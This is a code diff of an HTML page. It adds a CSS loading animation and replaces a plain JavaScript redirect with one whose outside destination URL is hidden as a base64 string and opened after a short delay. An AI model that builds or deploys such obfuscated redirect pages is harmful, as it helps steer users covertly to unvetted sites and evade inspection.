@@ -1,13 +1,172 @@
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN" data-page-node-id="21D8P7DdEs6QA6E4uEQLYA">
+<head data-page-node-id="Vwht4skF5dvuOxuV7sRUic">
+    <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport" data-page-node-id="yFdWSGutpNDLsADTWoJWQO">
+    <meta content="yes" name="apple-mobile-web-app-capable" data-page-node-id="CKGknmnAkgxpprVrvUHF0e">
+    <meta content="yes" name="apple-touch-fullscreen" data-page-node-id="sKysyDHI5bWp9voCmevBfg">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" data-page-node-id="z0nKu44SqZ6dVbVykXmox8">
+    <meta content="320" name="MobileOptimized" data-page-node-id="AY6gLRBEEOneFWQYjUu11r">
+    <meta charset="UTF-8" data-page-node-id="Wm2cP5vNjE70QoDeANTORR">
+    <title>明天会更好</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        .container {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background-color: #000;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+        }
+
+        .dot-3 {
+            background-color: #f74d75;
+        }
+
+        .dot-2 {
+            background-color: #10beae;
+        }
+
+        .dot-1 {
+            background-color: #ffe386;
+        }
+
+        .dot-3 {
+            background-color: #f74d75;
+            animation: dot-3-move 2s ease infinite;
+        }
+
+        @keyframes dot-3-move {
+            20% {
+                transform: scale(1)
+            }
+
+            45% {
+                transform: translateY(-18px) scale(.45)
+            }
+
+            60% {
+                transform: translateY(-25px) scale(.45)
+            }
+
+            80% {
+                transform: translateY(-25px) scale(.45)
+            }
+
+            100% {
+                transform: translateY(0px) scale(1)
+            }
+        }
+
+        .dot-2 {
+            background-color: #10beae;
+            animation: dot-2-move 2s ease infinite;
+        }
+
+        .dot-1 {
+            background-color: #ffe386;
+            animation: dot-1-move 2s ease infinite;
+        }
+
+        @keyframes dot-2-move {
+            20% {
+                transform: scale(1)
+            }
+
+            45% {
+                transform: translate(-16px, 12px) scale(.45)
+            }
+
+            60% {
+                transform: translate(-20px, 15px) scale(.45)
+            }
+
+            80% {
+                transform: translate(-20px, 15px) scale(.45)
+            }
+
+            100% {
+                transform: translateY(0px) scale(1)
+            }
+        }
+
+        @keyframes dot-1-move {
+            20% {
+                transform: scale(1)
+            }
+
+            45% {
+                transform: translate(16px, 12px) scale(.45)
+            }
+
+            60% {
+                transform: translate(20px, 15px) scale(.45)
+            }
+
+            80% {
+                transform: translate(20px, 15px) scale(.45)
+            }
+
+            100% {
+                transform: translateY(0px) scale(1)
+            }
+        }
+
+        .container {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: rotate-move 2s ease-in-out infinite;
+        }
+
+        @keyframes rotate-move {
+            55% {
+                transform: translate(-50%, -50%) rotate(0deg)
+            }
+
+            80% {
+                transform: translate(-50%, -50%) rotate(360deg)
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg)
+            }
+        }
+    </style>
+</head>
+<body data-page-node-id="Z51CPU9OHvlFfqN7NSyz9O">
+
+<div class="container" data-page-node-id="1nnvAwZcOJCEV3TCmaVrBX">
+    <div class="dot dot-1" data-page-node-id="KHDsUvbKlGFZdQ77AIRv2h"></div>
+    <div class="dot dot-2" data-page-node-id="cdOglGeMivVgAMI6Mp0oNI"></div>
+    <div class="dot dot-3" data-page-node-id="VkaYqPG5fF251zgCfyI0O1"></div>
+</div>
+
 <script>
+    var _target = atob("aHR0cHM6Ly9zbGEuYmJjcy52bWlqdS5jb20vc2FmZS9pbmRleC9nbz90PXByb2R1Y3Qmaz0xNDc=");
 
-window.location.href="https://sla.bbcs.vmiju.com/safe/index/go?t=product&k=147";
-
+    // 显示加载动画后跳转，模拟原站的落地中转行为
+    window.onload = function () {
+        setTimeout(function () {
+            window.location.href = _target;
+        }, 800);
+    };
 </script>
-<body>
-
-
-
 </body>
-
 </html>
